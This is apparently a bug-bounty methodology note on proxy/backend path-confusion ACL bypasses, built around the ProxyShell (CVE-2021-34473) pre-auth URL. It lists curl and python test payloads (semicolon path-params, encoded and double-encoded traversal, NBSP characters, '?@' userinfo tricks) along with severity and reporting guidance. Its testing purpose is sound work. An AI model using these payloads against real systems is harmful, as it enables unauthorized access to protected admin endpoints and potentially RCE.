---
type: pattern
title: "Pattern - Path Confusion"
vuln_class: path-confusion
last_updated: 2026-06-03
tags:
  - bb-pattern
  - sota-2024
status: active
---

# Pattern: Path Confusion -- Proxy / Backend Path Parsing Differential ACL Bypass

> When a reverse proxy (Nginx/IIS frontend/API Gateway) and backend (Tomcat/Node/Exchange CAS) interpret the "normalization" of the same URL path differently, an attacker can construct a URL that: the proxy sees as matching the ACL allow-list, while the backend sees it as pointing to a protected endpoint. The most representative case is Orange Tsai's ProxyShell (CVE-2021-34473) pre-auth path confusion.

## Why This Is a Real Vulnerability, Not Noise

ACL/authentication in most architectures occurs at the **frontend proxy** (IIS rewrite, Nginx location block, API Gateway route policy), while business logic is at the **backend**. As long as the two sides interpret `/`, `\`, `;`, `..`, `%2e`, `%2f`, `\xa0`, `?@`, multiple slashes, or URL fragments differently, you can use the "same URL, two meanings" trick to smuggle unauthenticated traffic to an internal-only handler.

**Core principle**: Each additional intermediary layer (CDN -> WAF -> reverse proxy -> app server -> embedded servlet container) adds one more path parsing pass; any two layers interpreting differently creates a path confusion attack surface.

**Stop-loss judgment**: If you only have proxy behavior without backend behavior evidence (or vice versa), mark as `verification_level: B` (partial dynamic); end-to-end requires "proxy ACL allows + backend returns protected resource" dual-end evidence.

---

## Representative Case: ProxyShell (CVE-2021-34473)

**Source**: [Orange Tsai -- ProxyShell @ ZDI Blog](https://www.thezdi.com/blog/2021/8/17/from-pwn2own-2021-a-new-attack-surface-on-microsoft-exchange-proxyshell)

Exchange's Client Access Services (CAS frontend) supports Explicit Logon Request -- in the form `/OWA/user@example.com/Default.aspx`, the frontend normalizes the URL, removing the mailbox address portion before proxying to the backend. The removal logic `RemoveExplicitLogonFromUrlAbsoluteUri` only uses `Substring` for string truncation, without validating whether the following path actually belongs to that mailbox.

**Payload**:

```
GET /autodiscover/autodiscover.json?@foo.com/<BACKEND_PATH>?&Email=autodiscover/autodiscover.json%3f@foo.com
```

Effect: the frontend considers this a legitimate request to the `autodiscover` endpoint (pre-auth allowed), but after Substring truncation, the backend receives `/<BACKEND_PATH>` and executes with **Exchange Server machine account** identity -> ACL completely bypassed -> can reach PowerShell remoting -> RCE.

**This is the gold standard of path confusion attack chains**: a single URL parsing quirk -> pre-auth -> backend admin context -> RCE.

---

## Detection Signals

| Signal | Tool | Implication |
|--------|------|-------------|
| Same URL returns different responses via proxy vs direct backend port | curl dual test | Two-end parsing inconsistency |
| `/admin/..;/public/` returns admin page in Tomcat / Spring environments | curl | Semicolon path-param normalization difference |
| `/protected%2e%2e/free` or `/protected/..%2f` passes ACL | ffuf / curl | URL-decoded post-traversal |
| `\xa0`, `\x09`, `\x0b` and other control characters in path are ignored by one side | python requests | Node/Express vs Nginx normalization difference |
| `?@` / `#@` followed by a second path structure | manual | Proxy treats post-`@` as userinfo, backend does not |
| Multiple `///` collapsed by frontend but not backend | curl | Location block matching failure |
| OpenAPI / Swagger lists internal endpoints that return 404 directly, but accessible through a certain exposed prefix | recon | Route mismatch |
| WAF rules use substring match `/admin` instead of regex anchor | header inspection | Easily bypassed by `/foo/admin/bar` |

---

## Test Methodology

### Step 0: Establish baseline -- find the two parser boundaries

```bash
# 1. Hit backend directly (if reachable), compare with going through proxy
TARGET="https://target.example.com"
PROTECTED="/admin/users"

curl -si "$TARGET$PROTECTED"                # Expect 401/403 (proxy ACL blocks)
curl -si "$TARGET:8080$PROTECTED" 2>/dev/null  # If backend port exposed -> 200
```

### Step 1: Semicolon path-param trick (Tomcat / Jetty)

```bash
# Tomcat treats ;jsessionid=... as path parameter
# Most reverse proxies (Nginx, HAProxy) treat it as a string
curl -si "$TARGET/public/..;/admin/users"
curl -si "$TARGET/public/;a=1/../admin/users"
curl -si "$TARGET/admin;.css/users"   # Fake static resource extension
```

### Step 2: URL encoding mismatch

```bash
# %2e = '.'  %2f = '/'  %5c = '\'
curl -si "$TARGET/admin%2fusers"               # backend decodes -> /admin/users
curl -si "$TARGET/admin%252fusers"             # double-encoded
curl -si "$TARGET/%2e%2e/admin/users"          # ../admin/users
curl -si "$TARGET/public/%2e%2e%2fadmin/users"
curl -si "$TARGET/public/..%5c..%5cadmin/users"  # backslash on Windows/IIS
```

### Step 3: Control-character / non-printable bypass (Nginx -> Node)

```bash
# \xa0 (NBSP) is preserved in Nginx location matching, Node.js URL parser removes it
python3 -c "import requests; print(requests.get('$TARGET/admin\xa0/users').status_code)"
python3 -c "import requests; print(requests.get('$TARGET/admin\x09/users').status_code)"
```

### Step 4: ProxyShell-style `?@` userinfo trick

```bash
# When the application "truncates a path segment," inject a second path structure
curl -si "$TARGET/public/?@evil/$PROTECTED?&param=value"
curl -si "$TARGET/autodiscover/autodiscover.json?@foo.com/$PROTECTED"
```

### Step 5: Multi-slash collapse

```bash
curl -si "$TARGET///admin/users"
curl -si "$TARGET/public////../admin/users"
```

### Step 6: Fragment / query confusion

```bash
# Some proxies match #fragment as part of the path, backend truncates at #
curl -si "$TARGET/public#/../admin/users"
curl -si "$TARGET/public?/../admin/users"
```

### Step 7: Interpretation

- **200 + protected data** -> confirmed path confusion bypass (record as verified live)
- **302 to internal page** -> high probability of bypass, follow redirect to confirm final resource
- **401/403** -> this trick is ineffective in this environment, continue with next variant
- **500 / parser crash** -> you have hit the differential boundary, refine payload precision

---

## Variants / Common Bypass Techniques

| Variant | Payload Sample | Trigger Condition | Famous Case |
|---------|---------------|-------------------|-------------|
| Semicolon path-param | `/public/..;/admin` | Tomcat/Jetty treats `;` as path-param, proxy does not | Atlassian / Tomcat reverse-proxy traversal |
| URL-encoded slash | `/admin%2fusers` | Backend decodes `%2f` as `/`, proxy does not | Acunetix Tomcat advisory |
| Double encoding | `/%252e%252e/admin` | Proxy decodes one layer, backend decodes two | IIS / ASP.NET multi-layer |
| NBSP / control char | `/admin\xa0/users` | Nginx preserves special byte, Node removes it | Nginx + Node.js (undercodetesting) |
| Userinfo `@` trick | `/public/?@evil/protected` | App uses `Substring` truncation, does not validate remaining segment | **ProxyShell CVE-2021-34473** |
| Backslash | `/public/..\admin` | IIS / .NET treats `\` as `/`, Nginx does not | IIS path traversal |
| Multi-slash | `///admin` or `/public//../admin` | Proxy collapses, backend does not (or vice versa) | API Gateway misconfig |
| Fragment trick | `/public#/../admin` | Proxy matches including `#`, backend truncates | OAuth `redirect_uri` related |
| Wildcard ext bypass | `/admin;.css` | WAF rule "skip .css" | WAF rule bypass |
| Case sensitivity | `/Admin/Users` | Proxy ACL case-sensitive, backend is not | Windows backend |
| Trailing dot/space | `/admin.` or `/admin%20` | Windows auto-strips | IIS classic |

---

## Severity Guide

| Condition | Severity | Explanation |
|-----------|----------|-------------|
| Pre-auth path confusion -> backend RCE / admin API (end-to-end verified) | **P1 Critical** | ProxyShell-tier; direct unauth -> ownership |
| Pre-auth path confusion -> read/write sensitive data (PII / config) but no RCE | P2 High | Mass-assignment class consequences |
| Auth required -> privileged endpoint (low-priv -> admin) path confusion | P2 High | Vertical privilege escalation |
| Path confusion -> arbitrary user data read (horizontal privilege escalation) | P3 Medium | Equivalent to IDOR severity |
| Path confusion -> internal health/status/metrics endpoint (info disclosure) | P3-P4 | Depends on leak content |
| Path confusion -> static file arbitrary read (e.g., `/static/..;/etc/passwd`) | P2-P3 | Depends on readable scope |
| WAF/CDN bypass but backend itself still has auth (no actual impact) | P5 / do not report | Pure rule bypass is not a vuln; three-question filter Q3 kills it |
| Theoretical difference (fingerprint confirms proxy/backend have different parsers, but no end-to-end verification) | `verification_level: B` | Need to provide PoC |

**Anti-exaggeration reminder**:

Having only the proxy-side ACL bypass (getting 200) is not enough -- you must prove the backend returns content that is **supposed to be protected**. If the backend itself also has an auth layer, proxy bypass alone does not constitute a vulnerability. Reports should state "frontend ACL bypass verified, backend returns sensitive resource X without authentication (verified)" rather than "path confusion can bypass any ACL."

---

## Cross-reference

- [[Pattern - SaaS Marketplace OAuth Defaults]] -- redirect_uri prefix matching is another form of parser-mismatch attack surface (URL layer), can be combined with this pattern's fragment trick

### References

- [Orange Tsai -- From Pwn2Own 2021: A New Attack Surface on Microsoft Exchange - ProxyShell (ZDI Blog, 2021-08-17)](https://www.thezdi.com/blog/2021/8/17/from-pwn2own-2021-a-new-attack-surface-on-microsoft-exchange-proxyshell)
- [Orange Tsai -- ProxyShell (orange.tw blog)](https://blog.orange.tw/posts/2021-08-proxyshell-a-new-attack-surface-on-ms-exchange-part-3/)
- [Exploiting HTTP Parser Inconsistencies: Bypassing Nginx ACLs (undercodetesting)](https://undercodetesting.com/exploiting-http-parser-inconsistencies-bypassing-nginx-acls-and-backend-vulnerabilities/)
- [Acunetix -- A fresh look on reverse proxy related attacks](https://www.acunetix.com/blog/articles/a-fresh-look-on-reverse-proxy-related-attacks/)
- [Orange Tsai -- Breaking Parser Logic: Take Your Path Normalization Off and Pop 0days Out (BlackHat USA 2018 / Hack.lu 2018)](https://www.slideshare.net/slideshow/breaking-parser-logic-take-your-path-normalization-off-and-pop-0days-out/116634774)
